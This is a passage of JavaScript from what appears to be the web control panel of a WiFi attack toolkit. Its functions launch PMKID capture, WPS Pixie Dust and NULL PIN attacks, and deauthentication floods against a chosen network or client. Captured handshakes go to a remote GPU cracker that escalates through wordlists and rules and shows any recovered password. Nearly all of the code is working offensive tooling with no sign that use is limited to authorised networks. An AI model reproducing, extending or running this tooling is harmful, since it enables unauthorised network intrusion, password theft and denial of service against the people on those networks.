                    // If completed (not running but has status), show final result
                    if (!status.running && status.status.includes('SUCCESS')) {
                        output += `\n\n‚úÖ ORCHESTRATOR COMPLETE - Check Captures page`;
                        // Stop polling since we're done
                        if (autoCaptureInterval) {
                            clearInterval(autoCaptureInterval);
                            autoCaptureInterval = null;
                        }
                        setStatus('IDLE', false);
                    }

                    updateAttackOutput(output);
                }
            } catch (error) {
                console.error('Error updating auto capture status:', error);
            }
        }
        async function pmkidActiveAttack() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            startCountdown('PMKID ACTIVE...', 130);
            updateAttackOutput('METHOD 1: Active PMKID (hcxdumptool)\n\nStarting active PMKID capture...\n');
            
            try {
                // Start the attack (returns immediately)
                const startResponse = await fetch('/api/attack/start_pmkid_active', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel, ssid, duration: 120 })
                });
                
                const startResult = await startResponse.json();
                if (!startResult.success) {
                    updateAttackOutput('Failed to start: ' + startResult.error);
                    stopCountdown();
                    return;
                }
                
                // Poll for live output
                let lastOutput = '';
                let pollCount = 0;
                const maxPolls = 90; // 90 * 1.5s = 135s max
                
                const pollInterval = setInterval(async () => {
                    pollCount++;
                    
                    try {
                        const outputResponse = await fetch('/api/attack/output');
                        const outputResult = await outputResponse.json();
                        
                        if (outputResult.output && outputResult.output !== lastOutput) {
                            lastOutput = outputResult.output;
                            updateAttackOutput(lastOutput);
                        }
                        
                        // Check if attack finished
                        if (!outputResult.running || pollCount >= maxPolls) {
                            clearInterval(pollInterval);
                            stopCountdown();
                            
                            // Final output fetch
                            const finalResponse = await fetch('/api/attack/output');
                            const finalResult = await finalResponse.json();
                            if (finalResult.output) {
                                updateAttackOutput(finalResult.output);
                            }
                        }
                    } catch (e) {
                        clearInterval(pollInterval);
                        stopCountdown();
                    }
                }, 1500);
                
            } catch (error) {
                updateAttackOutput('Error: ' + error.message);
                stopCountdown();
            }
        }
        
        let liveAttackPoll = null;
        
        async function wpsAttack() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            setStatus('WPS ATTACK...', true);
            updateAttackOutput('Starting WPS attack...\n');
            
            try {
                // Start the attack
                const response = await fetch('/api/attack/start_wps', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel, ssid })
                });
                
                const result = await response.json();
                if (!result.success) {
                    updateAttackOutput(result.output);
                    setStatus('IDLE', false);
                    return;
                }
                
                // Start polling for output
                liveAttackPoll = setInterval(async () => {
                    try {
                        const pollResp = await fetch('/api/attack/output');
                        const pollData = await pollResp.json();
                        
                        let output = pollData.output || 'Waiting for output...';
                        let display = output;
                        if (pollData.elapsed) {
                            display += '\n\n‚è±Ô∏è Elapsed: ' + pollData.elapsed + 's';
                        }
                        
                        // Detect failure patterns
                        const failed = output.includes('FAILED: Both quick WPS attacks failed') ||
                                       output.includes('WPS not detected') ||
                                       output.includes('Pixie Dust attack failed') && output.includes('NULL PIN attack failed');
                        
                        const success = output.includes('SUCCESS:') || output.includes('WPA PASSWORD:');
                        
                        // Detect looping (same transaction repeated)
                        const loopMatch = output.match(/Sending M2 message/g);
                        if (loopMatch && loopMatch.length > 10) {
                            display += '\n\n‚ö†Ô∏è Attack looping - stopping...';
                            stopLiveAttack();
                            updateAttackOutput(output + '\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n‚ùå NOT VULNERABLE\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\nRouter is not vulnerable to Pixie Dust or NULL PIN attacks.\nWPS is enabled but properly implemented.');
                            return;
                        }
                        
                        updateAttackOutput(display);
                        
                        // Check if attack finished or failed
                        if (!pollData.running || failed || success || pollData.elapsed > 400) {
                            clearInterval(liveAttackPoll);
                            liveAttackPoll = null;
                            setStatus('IDLE', false);
                            
                            if (failed || pollData.elapsed > 400) {
                                updateAttackOutput(output + '\n\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n‚ùå NOT VULNERABLE\n‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê\n\nRouter is not vulnerable to quick WPS attacks.\nPixie Dust and NULL PIN did not succeed.');
                            }
                        }
                    } catch (e) {
                        console.error('Poll error:', e);
                    }
                }, 1500);
                
            } catch (error) {
                updateAttackOutput('Error: ' + error.message);
                setStatus('IDLE', false);
            }
        }
        
        function stopLiveAttack() {
            if (liveAttackPoll) {
                clearInterval(liveAttackPoll);
                liveAttackPoll = null;
            }
            fetch('/api/attack/stop', { method: 'POST' });
            setStatus('IDLE', false);
            updateAttackOutput('Attack stopped by user');
        }
        
        async function globalKillSwitch() {
            if (!confirm('‚ö†Ô∏è KILL ALL OPERATIONS?\n\nThis will immediately stop:\n- All scans\n- All attacks\n- All portals\n- Everything network-related\n\nAre you sure?')) {
                return;
            }
            
            setStatus('KILLING ALL...', true);
            stopCountdown();
            
            // Stop all UI polling
            if (liveAttackPoll) { clearInterval(liveAttackPoll); liveAttackPoll = null; }
            if (typeof autoCaptureInterval !== 'undefined' && autoCaptureInterval) { clearInterval(autoCaptureInterval); autoCaptureInterval = null; }
            
            try {
                const response = await fetch('/api/kill_all', { method: 'POST' });
                const data = await response.json();
                
                setStatus('IDLE', false);
                updateAttackOutput('üõë KILL SWITCH ACTIVATED\n\n' + data.output);
            } catch (error) {
                setStatus('IDLE', false);
                updateAttackOutput('üõë Kill switch error: ' + error);
            }
        }
        
        async function stopCurrentOperation() {
            stopCountdown();
            
            if (liveAttackPoll) { clearInterval(liveAttackPoll); liveAttackPoll = null; }
            if (typeof autoCaptureInterval !== 'undefined' && autoCaptureInterval) { clearInterval(autoCaptureInterval); autoCaptureInterval = null; }
            
            setStatus('STOPPING...', true);
            
            try {
                const response = await fetch('/api/stop_current', { method: 'POST' });
                const data = await response.json();
                
                setStatus('IDLE', false);
                updateAttackOutput('‚èπÔ∏è STOPPED\n\n' + data.output);
            } catch (error) {
                setStatus('IDLE', false);
                updateAttackOutput('Stop error: ' + error);
            }
        }
        
        async function clientDeauthAttack() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            // Using updateAttackOutput() for both panels
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            startCountdown('CLIENT DEAUTH...', 180);
            updateAttackOutput('METHOD 3: Targeted Client Deauth\n\nScanning for connected clients...\n');
            
            try {
                const response = await fetch('/api/attack_client_deauth', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel, ssid })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            stopCountdown();
        }
        
        async function deauthFloodAttack() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            // Using updateAttackOutput() for both panels
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            startCountdown('DEAUTH FLOOD...', 180);
            updateAttackOutput('METHOD 4: Continuous Deauth Flood\n\nSending overwhelming deauth stream...\n');
            
            try {
                const response = await fetch('/api/attack_deauth_flood', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel, ssid })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            stopCountdown();
        }
        
        async function extendedCaptureAttack() {
            const bssid = document.getElementById('targetBSSID').value;
            const channel = document.getElementById('targetChannel').value;
            const ssid = document.getElementById('targetSSID').value;
            // Using updateAttackOutput() for both panels
            
            if (!bssid || !channel) {
                updateAttackOutput('Please select a target network first!');
                return;
            }
            
            startCountdown('EXTENDED CAPTURE...', 300);
            updateAttackOutput('METHOD 5: Extended Capture\n\nMultiple deauth waves over 5 minutes...\n');
            
            try {
                const response = await fetch('/api/attack_extended', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ bssid, channel, ssid })
                });
                
                const result = await response.json();
                updateAttackOutput(result.output);
            } catch (error) {
                updateAttackOutput(`Error: ${error.message}`);
            }
            
            stopCountdown();
        }
        // Load captures on page load
        window.addEventListener('load', function() {
            loadCaptures();
        });
    
// Store last intel results for client targeting
let lastIntelClients = [];

function populateClientSelector(clients) {
    const selector = document.getElementById('clientSelector');
    const section = document.getElementById('clientTargetSection');
    const info = document.getElementById('clientInfo');
    
    // Clear existing options
    selector.innerHTML = '<option value="">-- Select Client --</option>';
    lastIntelClients = clients || [];
    
    if (clients && clients.length > 0) {
        clients.forEach((client, idx) => {
            const option = document.createElement('option');
            option.value = client.mac;
            option.textContent = `${client.vendor || 'Unknown'} | ${client.mac} | ${client.signal} dBm`;
            selector.appendChild(option);
        });
        section.style.display = 'block';
        info.textContent = `${clients.length} client(s) found - select one to kick`;
    } else {
        section.style.display = 'none';
    }
}

function kickSelectedClient() {
    const selector = document.getElementById('clientSelector');
    const clientMac = selector.value;
    
    if (!clientMac) {
        updateAttackOutput('Please select a client to kick!');
        return;
    }
    
    if (!selectedTarget || !selectedTarget.bssid) {
        updateAttackOutput('Please select a target network first!');
        return;
    }
    
    // Find client info
    const client = lastIntelClients.find(c => c.mac === clientMac);
    const clientDesc = client ? `${client.vendor} (${clientMac})` : clientMac;
    
    updateAttackOutput(`üéØ Kicking ${clientDesc} from ${selectedTarget.ssid}...`);
    
    fetch('/api/deauth_client', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            bssid: selectedTarget.bssid,
            channel: selectedTarget.channel,
            ssid: selectedTarget.ssid,
            client_mac: clientMac,
            count: 20
        })
    })
    .then(response => response.json())
    .then(data => {
        updateAttackOutput(data.output);
    })
    .catch(error => {
        updateAttackOutput(`Error: ${error.message}`);
    });
}

function updateAttackOutput(message, isHtml = false) {
    // Update both output panels with auto-scroll to bottom
    const mainOutput = document.getElementById('mainAttackOutput');
    const sideOutput = document.getElementById('attackOutput');
    
    if (isHtml) {
        if (mainOutput) mainOutput.innerHTML = message;
        if (sideOutput) sideOutput.innerHTML = message;
    } else {
        if (mainOutput) mainOutput.textContent = message;
        if (sideOutput) sideOutput.textContent = message;
    }
    
    // Auto-scroll to bottom
    if (mainOutput) mainOutput.scrollTop = mainOutput.scrollHeight;
    if (sideOutput) sideOutput.scrollTop = sideOutput.scrollHeight;
}

function monitorClients() {
    const output = document.getElementById('monitorOutput');
    
    if (!selectedTarget) {
        updateAttackOutput('Please select a target network first!');
        return;
    }
    
    startCountdown('GATHERING INTEL...', 30);
    updateAttackOutput(`Gathering intelligence on ${selectedTarget.ssid}...\n\nScanning for 30 seconds...`);
    
    const duration = 30;
    
    fetch('/api/target_intel', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            bssid: selectedTarget.bssid,
            channel: selectedTarget.channel,
            ssid: selectedTarget.ssid,
            duration: duration
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success && data.output) {
            // Format the output with colors
            let html = data.output
                .replace(/‚ïê+/g, '<span style="color: #006600;">$&</span>')
                .replace(/TARGET BRIEF:/g, '<span style="color: #00ff00; font-weight: bold;">TARGET BRIEF:</span>')
                .replace(/CLIENTS \(\d+\)/g, '<span style="color: #00ff00; font-weight: bold;">$&</span>')
                .replace(/RECOMMENDATION/g, '<span style="color: #00ff00; font-weight: bold;">RECOMMENDATION</span>')
                .replace(/‚óè/g, '<span style="color: #00ff00;">‚óè</span>')
                .replace(/‚óã/g, '<span style="color: #666;">‚óã</span>')
                .replace(/‚úì/g, '<span style="color: #00ff00;">‚úì</span>')
                .replace(/‚òÖ/g, '<span style="color: #ffcc00;">‚òÖ</span>')
                .replace(/‚ö†/g, '<span style="color: #ff6600;">‚ö†</span>')
                .replace(/ACTIVE/g, '<span style="color: #00ff00;">ACTIVE</span>')
                .replace(/Idle/g, '<span style="color: #666;">Idle</span>')
                .replace(/Moderate/g, '<span style="color: #88ff88;">Moderate</span>')
                .replace(/Excellent/g, '<span style="color: #00ff00;">Excellent</span>')
                .replace(/Good/g, '<span style="color: #88ff88;">Good</span>')
                .replace(/Fair/g, '<span style="color: #ffcc00;">Fair</span>')
                .replace(/Weak/g, '<span style="color: #ff6600;">Weak</span>')
                .replace(/\\n/g, '<br>')
                .replace(/\n/g, '<br>');
            output.innerHTML = '<pre style="margin:0; white-space: pre-wrap; font-family: monospace;">' + html + '</pre>';
            // Populate client selector for targeted deauth
            populateClientSelector(data.clients);
        } else {
            output.textContent = data.output || 'Intel gathering failed';
            populateClientSelector([]);
        }
        stopCountdown();
    })
    .catch(error => {
        updateAttackOutput(`Error: ${error.message}`);
        stopCountdown();
    });
}


        // ========== GLASS CRACKER FUNCTIONS ==========
        
        let glassPollingInterval = null;
        
        async function checkGlassConnection() {
            const statusEl = document.getElementById('glassConnectionStatus');
            statusEl.textContent = 'Checking...';
            statusEl.style.background = '#333300';
            statusEl.style.color = '#ffff00';
            
            try {
                const response = await fetch('/api/glass/status');
                const result = await response.json();
                
                if (result.error) {
                    statusEl.textContent = 'üî¥ Offline';
                    statusEl.style.background = '#330000';
                    statusEl.style.color = '#ff0000';
                } else {
                    statusEl.textContent = 'üü¢ Connected';
                    statusEl.style.background = '#003300';
                    statusEl.style.color = '#00ff00';
                    updateGlassStatus(result);
                    fetchGpuStats();
                }
            } catch (error) {
                statusEl.textContent = 'üî¥ Offline';
                statusEl.style.background = '#330000';
                statusEl.style.color = '#ff0000';
            }
        }
        
        function updateGlassStatus(status) {
            document.getElementById('glassCurrentFile2').textContent = status.file || '-';
            document.getElementById('glassStatusText2').textContent = status.status || 'Idle';
            // Parse stage from status string and add description
            let stageDisplay = '-';
            if (status.status && status.status.startsWith('Stage ')) {
                const stageNum = status.status.split(':')[0].replace('Stage ', '');
                const stageDescs = {
                    '1': '1 - Common (~1m)',
                    '2': '2 - Expanded (~10m)',
                    '3a': '3a - Rules (~1h)',
                    '3b': '3b - More rules (~2h)',
                    '4a': '4a - RockYou (~30h)',
                    '4b': '4b - RockYou+rules (~7d)',
                    '5': '5 - Exhaustive (weeks)'
                };
                stageDisplay = stageDescs[stageNum] || stageNum;
            }
            document.getElementById('glassStageText').textContent = status.stage || stageDisplay;
            document.getElementById('glassSpeedText').textContent = status.speed || '-';
            document.getElementById('glassETAText').textContent = status.eta || '-';
            document.getElementById('glassElapsedText').textContent = status.elapsed || '-';
            
            // Progress bar
            const progress = parseFloat(status.progress) || 0;
            document.getElementById('glassProgressBar').style.width = progress + '%';
            document.getElementById('glassProgressText').textContent = progress.toFixed(1) + '%';
            
            // Show cracked password if found
            if (status.password) {
                document.getElementById('crackedPasswordBox').style.display = 'block';
                document.getElementById('crackedPassword').textContent = status.password;
            } else {
                document.getElementById('crackedPasswordBox').style.display = 'none';
            }
        }
        
        async function getSelectedOrQueuedFile() {
            // 1. Try checked file in Local Captures
            const checkedBoxes = document.querySelectorAll('.capture-checkbox:checked');
            if (checkedBoxes.length > 0) {
                return checkedBoxes[0].value;
            }

            // 2. Try current running file from Glass status
            try {
                const statusResp = await fetch('/api/glass/status');
                const status = await statusResp.json();
                if (status.file && status.file !== '-') {
                    return status.file;
                }
            } catch (e) {}

            // 3. Try first file in Glass queue
            try {
                const queueResp = await fetch('/api/glass/queue');
                const queue = await queueResp.json();
                if (queue.waiting && queue.waiting.length > 0) {
                    const first = queue.waiting[0];
                    return typeof first === 'string' ? first : first.file;
                }
            } catch (e) {}

            return null;
        }

        async function runGlassStage(stage) {
            const selectedCrackFile = await getSelectedOrQueuedFile();
            if (!selectedCrackFile) {
                logGlassActivity('‚ö†Ô∏è No file selected or in queue');
                return;
            }
            logGlassActivity('üöÄ Starting Stage ' + stage + ' on ' + selectedCrackFile);

            try {
                const response = await fetch('/api/glass/run_stage', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({filename: selectedCrackFile, stage: stage})
                });
                const result = await response.json();

                if (result.success) {
                    logGlassActivity('‚úì Stage ' + stage + ' started');
                    startGlassPolling();
                } else {
                    logGlassActivity('‚úó Error: ' + result.output);
                }
            } catch (error) {
                logGlassActivity('‚úó Connection error: ' + error.message);
            }
        }

        async function autoEscalateGlass() {
            const selectedCrackFile = await getSelectedOrQueuedFile();
            if (!selectedCrackFile) {
                logGlassActivity('‚ö†Ô∏è No file selected or in queue');
                return;
            }
            logGlassActivity('üöÄ Starting Auto-Escalate on ' + selectedCrackFile);

            try {
                const response = await fetch('/api/glass/auto_escalate', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({filename: selectedCrackFile})
                });
                const result = await response.json();

                if (result.success) {
                    logGlassActivity('‚úì Auto-Escalate started (Stages 1-5)');
                    startGlassPolling();
                } else {
                    logGlassActivity('‚úó Error: ' + result.output);
                }
            } catch (error) {
                logGlassActivity('‚úó Connection error: ' + error.message);
            }
        }
        
        async function startGlassQueue() {
            logGlassActivity('‚ñ∂Ô∏è Starting next in queue...');
            try {
                // Get queue to find first file
                const queueResponse = await fetch('/api/glass/queue');
                const queue = await queueResponse.json();
                
                let fileToStart = null;
                if (queue.waiting && queue.waiting.length > 0) {
                    const first = queue.waiting[0];
                    fileToStart = typeof first === 'string' ? first : first.file;
                }
                
                if (!fileToStart) {
                    logGlassActivity('‚ö†Ô∏è Queue is empty - send files first');
                    return;
                }
                
                const response = await fetch('/api/glass/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ filename: fileToStart, stage: '1' })
                });
                const result = await response.json();
                
                if (result.success) {
                    logGlassActivity('‚úì Started: ' + fileToStart);
                    refreshGlassQueue();
                } else {
                    logGlassActivity('‚ö†Ô∏è ' + (result.error || result.message || 'Failed to start'));
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error: ' + error);
            }
        }
        
        async function stopGlass() {
            logGlassActivity('‚èπÔ∏è Stopping Glass...');

            try {
                const response = await fetch('/api/glass/stop', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({})
                });
                const result = await response.json();
                logGlassActivity('‚úì Stop command sent');
                // Don't stop polling - keep Live Status updating
            } catch (error) {
                logGlassActivity('‚úó Error: ' + error.message);
            }
        }
        
        function startGlassPolling() {
            if (glassPollingInterval) return;
            glassPollingInterval = setInterval(pollGlassStatus, 2000);
            pollGlassStatus(); // Immediate first poll
        }
        
        function startGlassLivePolling() {
            if (glassPollingInterval) return;
            glassPollingInterval = setInterval(() => {
                pollGlassStatus();
                refreshGlassQueue();
            }, 3000);
            // Immediate first poll
            pollGlassStatus();
            refreshGlassQueue();
        }
        
        function stopGlassPolling() {
            if (glassPollingInterval) {
                clearInterval(glassPollingInterval);
                glassPollingInterval = null;
            }
        }
        
        async function pollGlassStatus() {
            const statusEl = document.getElementById('glassConnectionStatus');
            try {
                const response = await fetch('/api/glass/status');
                const status = await response.json();

                // Check if Glass returned an error
                if (status.error) {
                    statusEl.textContent = 'üî¥ Offline';
                    statusEl.style.background = '#330000';
                    statusEl.style.color = '#ff0000';
                    document.getElementById('glassStatusText2').textContent = 'Glass Offline';
                    return;
                }

                // Glass is connected
                statusEl.textContent = 'üü¢ Connected';
                statusEl.style.background = '#003300';
                statusEl.style.color = '#00ff00';

                updateGlassStatus(status);

                // Also fetch GPU stats
                fetchGpuStats();

                // Log cracked password (but don't stop polling - stay live)
                if (status.status && status.status.includes('Cracked') && status.password) {
                    logGlassActivity('üîì PASSWORD FOUND: ' + status.password);
                }
            } catch (error) {
                // Network error - Glass is offline
                statusEl.textContent = 'üî¥ Offline';
                statusEl.style.background = '#330000';
                statusEl.style.color = '#ff0000';
                document.getElementById('glassStatusText2').textContent = 'Glass Offline';
            }
        }
        
        async function fetchGpuStats() {
            try {
                const response = await fetch('/api/glass/gpu_stats');
                const stats = await response.json();
                
                document.getElementById('gpuPercent').textContent = stats.gpu_percent + '%';
                const tempF = Math.round(stats.temp_c * 9/5 + 32);
                document.getElementById('gpuTemp').textContent = tempF + '¬∞F';
                document.getElementById('gpuVram').textContent = stats.vram_used_gb + '/' + stats.vram_total_gb + 'GB';
                
                // Color code GPU percentage
                const gpuEl = document.getElementById('gpuPercent');
                if (stats.gpu_percent > 80) {
                    gpuEl.style.color = '#00ff00';
                } else if (stats.gpu_percent > 50) {
                    gpuEl.style.color = '#ffff00';
                } else {
                    gpuEl.style.color = '#ff6600';
                }
                
                // Color code temp (F)
                const tempEl = document.getElementById('gpuTemp');
                if (tempF > 185) {
                    tempEl.style.color = '#ff0000';  // Hot
                } else if (tempF > 158) {
                    tempEl.style.color = '#ffff00';  // Warm
                } else {
                    tempEl.style.color = '#00ff00';  // Cool
                }
            } catch (error) {
                // Silent fail
            }
        }
        
        let localCrackPoll = null;
        let lastLocalCrackStage = null;  // Track to avoid log spam

        async function crackOnShadowframe() {
            const checkedBoxes = document.querySelectorAll('.capture-checkbox:checked');
            if (checkedBoxes.length === 0) {
                logGlassActivity('‚ö†Ô∏è Check a file first');
                return;
            }
            
            const selectedCrackFile = checkedBoxes[0].value;
            logGlassActivity('üíª Starting local crack on Sh4d0wFr4m3...');
            
            try {
                const response = await fetch('/api/crack/local/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ filename: selectedCrackFile })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    // Start polling for status
                    localCrackPoll = setInterval(pollLocalCrack, 1500);
                } else {
                    logGlassActivity('‚ö†Ô∏è Error: ' + result.output);
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error: ' + error);
            }
        }
        
        async function pollLocalCrack() {
            try {
                const response = await fetch('/api/crack/local/status');
                const status = await response.json();

                if (status.running) {
                    // Only log when stage changes to avoid spam
                    if (status.stage !== lastLocalCrackStage) {
                        logGlassActivity('üìã ' + status.stage);
                        lastLocalCrackStage = status.stage;
                    }
                } else {
                    // Done - stop polling
                    if (localCrackPoll) {
                        clearInterval(localCrackPoll);
                        localCrackPoll = null;
                    }
                    lastLocalCrackStage = null;

                    if (status.cracked) {
                        logGlassActivity('üéâ CRACKED: ' + status.password);
                    } else if (status.stopped) {
                        logGlassActivity('‚èπÔ∏è Stopped by user');
                    } else {
                        logGlassActivity('‚ùå Not cracked with quick attacks');
                        logGlassActivity('üí° Send to Glass for full attack');
                    }
                }
            } catch (error) {
                if (localCrackPoll) {
                    clearInterval(localCrackPoll);
                    localCrackPoll = null;
                }
                lastLocalCrackStage = null;
            }
        }
        
        async function stopLocalCrack() {
            if (localCrackPoll) {
                clearInterval(localCrackPoll);
                localCrackPoll = null;
            }
            lastLocalCrackStage = null;

            try {
                await fetch('/api/crack/local/stop', { method: 'POST' });
                logGlassActivity('‚èπÔ∏è Stopping local crack...');
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error stopping: ' + error);
            }
        }
        
        async function sendSelectedToGlass() {
            const checkedBoxes = document.querySelectorAll('.capture-checkbox:checked');
            if (checkedBoxes.length === 0) {
                logGlassActivity('‚ö†Ô∏è Check a file first');
                return;
            }
            
            const filename = checkedBoxes[0].value;
            logGlassActivity('üì§ Uploading ' + filename + ' to Glass...');
            
            try {
                const response = await fetch('/api/glass/upload', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({filename: filename})
                });
                const result = await response.json();
                
                if (result.success) {
                    logGlassActivity('‚úì Uploaded to Glass inbox');
                    refreshGlassQueue();
                } else {
                    logGlassActivity('‚úó Upload failed: ' + result.output);
                }
            } catch (error) {
                logGlassActivity('‚úó Connection error: ' + error.message);
            }
        }
        
        async function refreshGlassQueue() {
            const currentEl = document.getElementById('glassCurrentJob');
            const queueEl = document.getElementById('glassQueueList');
            
            try {
                const response = await fetch('/api/glass/queue');
                const result = await response.json();
                
                // Current job
                if (result.current) {
                    const c = result.current;
                    const pauseIcon = c.paused ? '‚è∏Ô∏è PAUSED - ' : '';
                    currentEl.innerHTML = pauseIcon + c.file + '<br><span style="color: #888;">' + c.progress + ' | ' + (c.stage || '-') + '</span>';
                    currentEl.style.borderColor = c.paused ? '#888800' : '#00ff00';
                } else {
                    currentEl.textContent = 'Idle';
                    currentEl.style.borderColor = '#003300';
                }
                
                // Waiting queue with controls
                if (result.waiting && result.waiting.length > 0) {
                    queueEl.innerHTML = result.waiting.map((item, idx) => {
                        const f = typeof item === 'string' ? item : item.file;
                        const hasCheckpoint = item.has_checkpoint || false;
                        const progress = item.progress || '';
                        const checkpointIcon = hasCheckpoint ? '‚è∏Ô∏è ' : '';
                        const progressText = progress ? ' (' + progress + ')' : '';
                        const actionBtn = hasCheckpoint 
                            ? '<button onclick="resumeGlassFile(\'' + f + '\')" style="padding: 2px 6px; background: #444400; border: 1px solid #666600; color: #ff0; cursor: pointer;" title="Resume from checkpoint">‚èµ</button>'
                            : '<button onclick="startGlassFile(\'' + f + '\')" style="padding: 2px 6px; background: #004400; border: 1px solid #006600; color: #0f0; cursor: pointer;" title="Start cracking this file now">‚ñ∂</button>';
                        
                        return '<div style="display: flex; align-items: center; padding: 5px; border-bottom: 1px solid #333; gap: 5px;">' +
                            '<div style="flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="' + f + '">' + checkpointIcon + f + progressText + '</div>' +
                            '<button onclick="moveQueueItem(\'' + f + '\', \'up\')" style="padding: 2px 6px; background: #333; border: 1px solid #555; color: #0f0; cursor: pointer;" title="Move up in queue">‚ñ≤</button>' +
                            '<button onclick="moveQueueItem(\'' + f + '\', \'down\')" style="padding: 2px 6px; background: #333; border: 1px solid #555; color: #0f0; cursor: pointer;" title="Move down in queue">‚ñº</button>' +
                            '<button onclick="removeFromQueue(\'' + f + '\')" style="padding: 2px 6px; background: #440000; border: 1px solid #660000; color: #f00; cursor: pointer;" title="Remove from queue">‚úï</button>' +
                            actionBtn +
                        '</div>';
                    }).join('');
                } else {
                    queueEl.textContent = 'Queue empty';
                }
            } catch (error) {
                currentEl.textContent = 'Error';
                queueEl.textContent = 'Error loading queue';
            }
        }
        
        async function pauseGlassCrack() {
            logGlassActivity('‚è∏Ô∏è Pausing crack...');
            try {
                const response = await fetch('/api/glass/pause', { method: 'POST' });
                const result = await response.json();
                if (result.success) {
                    logGlassActivity('‚úì Crack paused - checkpoint saved');
                    refreshGlassQueue();
                } else {
                    logGlassActivity('‚ö†Ô∏è ' + (result.error || 'Failed to pause'));
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error: ' + error);
            }
        }
        
        async function resumeGlassCrack() {
            logGlassActivity('‚ñ∂Ô∏è Resuming crack...');
            try {
                const response = await fetch('/api/glass/resume', { 
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({})
                });
                const result = await response.json();
                if (result.success) {
                    logGlassActivity('‚úì Crack resumed from checkpoint');
                    refreshGlassQueue();
                } else {
                    logGlassActivity('‚ö†Ô∏è ' + (result.error || 'Failed to resume'));
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error: ' + error);
            }
        }
        
        async function moveQueueItem(filename, direction) {
            try {
                const response = await fetch('/api/glass/queue/move', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ filename: filename, direction: direction })
                });
                const result = await response.json();
                if (result.success) {
                    refreshGlassQueue();
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error moving: ' + error);
            }
        }

        async function removeFromQueue(filename) {
            try {
                const response = await fetch('/api/glass/queue/remove', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ filename: filename })
                });
                const result = await response.json();
                if (result.success) {
                    logGlassActivity('üóëÔ∏è Removed: ' + filename);
                    refreshGlassQueue();
                } else {
                    logGlassActivity('‚ö†Ô∏è ' + (result.error || 'Failed to remove'));
                }
            } catch (error) {
                logGlassActivity('‚ö†Ô∏è Error removing: ' + error);
            }
        }

        async function startGlassFile(filename) {
